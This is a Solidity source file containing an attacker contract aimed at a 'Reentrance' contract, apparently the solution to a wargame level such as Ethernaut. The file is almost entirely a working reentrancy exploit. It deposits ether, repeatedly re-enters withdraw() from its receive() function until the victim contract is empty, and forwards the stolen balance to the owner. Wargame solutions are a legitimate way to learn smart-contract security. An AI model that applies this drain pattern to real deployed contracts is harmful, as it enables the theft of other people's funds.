// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.19;

import "../../src/Reentrance/Reentrance.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

contract ThisIsNothing is Ownable {
    Reentrance public reentrance;
    uint256 public initialDeposit;

    // @dev requires 1 ether to be sent to the contract upon deployment
    constructor(address _reentrance) payable {
        reentrance = Reentrance(payable(_reentrance));
    }

    function yoink() public payable onlyOwner {
        // while be used later to determine withdraw amount
        initialDeposit = msg.value;
        // need a balance to exploit reentrancy in withdraw
        reentrance.donate{value: msg.value}(address(this));
        //begin exploit
        _withdraw();
        // send eth to owner
        payable(owner()).call{value: address(this).balance}("");
    }

    function _withdraw() private {
        // log victim balance
        uint256 contractBal = address(reentrance).balance;
        // determine if the contract has more than the initial deposit, so we know to continue withdrawing
        if (contractBal > initialDeposit) {
            // withdraw all funds from reentrance contract
            reentrance.withdraw(initialDeposit);
        } else {
            // meaning no more loop needed; will be last withdraw
            // sending initialDeposit will revert with not enough funds
            reentrance.withdraw(contractBal);
        }
    }

    receive() external payable {
        // reenter
        _withdraw();
    }
}
